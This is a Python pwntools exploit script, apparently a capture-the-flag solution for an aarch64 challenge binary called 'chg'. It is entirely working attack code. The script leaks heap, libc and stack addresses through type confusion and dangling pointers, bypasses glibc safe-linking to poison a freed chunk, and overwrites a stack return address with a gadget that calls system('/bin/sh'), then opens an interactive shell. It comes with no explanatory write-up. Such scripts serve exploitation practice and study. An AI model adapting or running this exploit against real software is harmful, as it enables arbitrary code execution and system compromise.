from pwn import *

TYPE_LONG           = 1
TYPE_DOUBLE         = 2
TYPE_STRING         = 3

CMD_ADD             = b"1"
CMD_GET             = b"2"
CMD_EDIT            = b"3"
CMD_DEL             = b"4"

CURRENT_IDX         = 0
MAIN_ARENA_OFF      = 0x19bb48
GADGET_OFF          = 0x132c8c
X19_ADDR_IDX_OFF    = 56

def add(s, typ, data):
    global CURRENT_IDX

    CURRENT_IDX += 1
    s.sendlineafter(b"> ", CMD_ADD)
    s.sendlineafter(b"str=3): ", bytes(str(typ), "utf-8"))
    s.sendafter(b"Data: ", data + b"\n")
    return CURRENT_IDX - 1

def get(s, idx, typ):
    s.sendlineafter(b"> ", CMD_GET)
    s.sendlineafter(b"Index: ", bytes(str(idx), "utf-8"))
    s.sendlineafter(b"str=3): ", bytes(str(typ), "utf-8"))
    s.recvuntil(b"Data: ")
    return s.recvline()[:-1]

def edit(s, idx, typ, data):
    s.sendlineafter(b"> ", CMD_EDIT)
    s.sendlineafter(b"Index: ", bytes(str(idx), "utf-8"))
    s.sendlineafter(b"str=3): ", bytes(str(typ), "utf-8"))
    s.sendafter(": ", bytes(str(data), "utf-8") + b"\n")

def delete(s, idx):
    global CURRENT_IDX

    CURRENT_IDX -= 1
    s.sendlineafter(b"> ", CMD_DEL)
    s.sendlineafter(b"Index: ", bytes(str(idx), "utf-8"))
    return

def create_dangling_ptr_in_fpool(p):
    add(p, TYPE_STRING, b"R"*0x60)
    list_data_ptr = int(get(p, 0, TYPE_LONG))
    delete(p, 0)

    for i in range(8):
        add(p, TYPE_LONG, bytes(str(0), "utf-8"))
    for i in range(8):
        delete(p, 0)

    return list_data_ptr

def leak_ptrs(p):
    add(p, TYPE_STRING, b"C"*0x10)
    for i in range(9):
        add(p, TYPE_STRING, b"C"*0x7f)
    for i in range(8):
        delete(p, 0)

    # leak heap (type confusion)
    heap_addr = int(get(p, 0, TYPE_LONG))
    
    print("[*] edit list[1] to point to list[0], which has main_arena symbol in its content")
    edit(p, 1, TYPE_LONG, heap_addr)

    print("[*] delete list[0], move list[1] one position backward")
    delete(p, 0)

    print("[*] read the dangling pointer in list[0] with TYPE_STRING, leak libc")

    main_arena = u64(get(p, 0, TYPE_STRING).ljust(8, b"\x00"))
    return (heap_addr, main_arena)

def arbitrary_read(p, addr):
    idx = add(p, TYPE_LONG, bytes(str(addr), "utf-8"))
    val = u64(get(p, idx, TYPE_STRING)[:8].ljust(8, b"\x00"))
    delete(p, idx)
    return val

def get_return_addr_target(p, stack_addr):
    addr = (stack_addr & 0xfffffffffffffff0) - 0x2000

    while addr < stack_addr:
        val = arbitrary_read(p, addr)
        if (val & 0xfff) == 0xffc:
            stack_cookie = arbitrary_read(p, addr-0x30-0x10)
            print("[*] stack_cookie == 0x%x" % stack_cookie)
            print("[*] found good return address! *(0x%x) == 0x%x" % (addr, val))
            return addr - 0x30
        addr += 8

    raise Exception("Fail to find return address on the stack")

def exploit(p):
    libc = ELF("/lib/aarch64-linux-gnu/libc.so.6")
    main_bin = ELF("./distfiles/chg")

    # start by leaking heap && libc addresses
    list_data_ptr = create_dangling_ptr_in_fpool(p)
    print("[*] good, now fpool[0] points to list. list_data_ptr == 0x%x" % list_data_ptr)

    heap_addr, main_arena = leak_ptrs(p)
    print("[*] heap_addr @ 0x%x" % heap_addr)
    print("[*] main_arena @ 0x%x" % main_arena)

    libc_base = main_arena - MAIN_ARENA_OFF
    system_addr = libc_base + libc.symbols["system"]
    print("[*] resolved addresses:")
    print("\tlibc @ 0x%x" % libc_base)
    print("\tsystem @ 0x%x" % system_addr)

    # leak an address on the stack
    env_ptr = arbitrary_read(p, libc_base + libc.symbols["_environ"])
    print("[*] env_ptr == 0x%x" % env_ptr)

    stack_addr = arbitrary_read(p, env_ptr)
    print("[*] stack_addr == 0x%x" % stack_addr)

    return_addr = get_return_addr_target(p, stack_addr)
    target_addr = list_data_ptr - 0x50

    print("[*] return_addr == 0x%x" % return_addr)
    print("[*] target_addr == 0x%x" % target_addr)

    if target_addr & 0xf == 0:
        corrupt_prefix_length = 0x50
        target_addr -= 0x50
    elif target_addr & 0xf == 8:
        corrupt_prefix_length = 0x58
        target_addr -= 0x58
    else:
        raise Exception("unaligned address")

    # start corruption phase!
    bin_sh_idx = add(p, TYPE_STRING, b"/bin/sh")
    bin_sh_addr = int(get(p, bin_sh_idx, TYPE_LONG))
    print("[*] bin_sh_addr == 0x%x" % bin_sh_addr)

    strings_idx = []
    strings_idx.append(add(p, TYPE_STRING, b"P"*0x60))
    strings_idx.append(add(p, TYPE_STRING, b"P"*0x60))
    strings_idx.append(add(p, TYPE_STRING, b"P"*0x60))

    # bypassing new pointer encoding
    last_freed = int(get(p, strings_idx[-1], TYPE_LONG))
    print("[*] last_freed == 0x%x" % last_freed)
    delete(p, strings_idx[:-1])

    print("[*] trigger a free of the list pointer, and call edit to corrupt FD and gain arbitrary write")
    edit(p, 1, TYPE_LONG, list_data_ptr)
    delete(p, 1)
    
    # __free_hook trick does not work in new versions. Let's do ROP on the stack instead
    print("[*] corrupt list_data_ptr->FD, make it point to an address on the heap before the list structure")
    target_addr_enc = target_addr ^ (last_freed >> 12)
    edit(p, 0, TYPE_LONG, target_addr_enc)
 
    # Trigger our arbitrary write
    faked_size = 0x22222222
    for i in range(2):
        fake = b"D" * (corrupt_prefix_length)
        fake += p32(faked_size) # size
        fake += p32(0x7fffffff) # max, avoid reallocation
        fake += p64(return_addr - faked_size * 8 + 0x100 * 8)
        add(p, TYPE_STRING, fake)

    # now list->data points to the stack. Test it out: let's corrupt the return address
    edit(p, faked_size - 0x100 + X19_ADDR_IDX_OFF, TYPE_LONG, system_addr)
    edit(p, faked_size - 0x100 + X19_ADDR_IDX_OFF + 1, TYPE_LONG, bin_sh_addr)
    edit(p, faked_size - 0x100, TYPE_LONG, libc_base + GADGET_OFF)

if __name__ == "__main__":
    p = process("./distfiles/chg", env={"LD_LIBRARY_PATH": "./distfiles"})
    input("attach")
    exploit(p)
    print("[*] exploit done, system('/bin/sh') achieved, call interactive()")
    p.interactive()
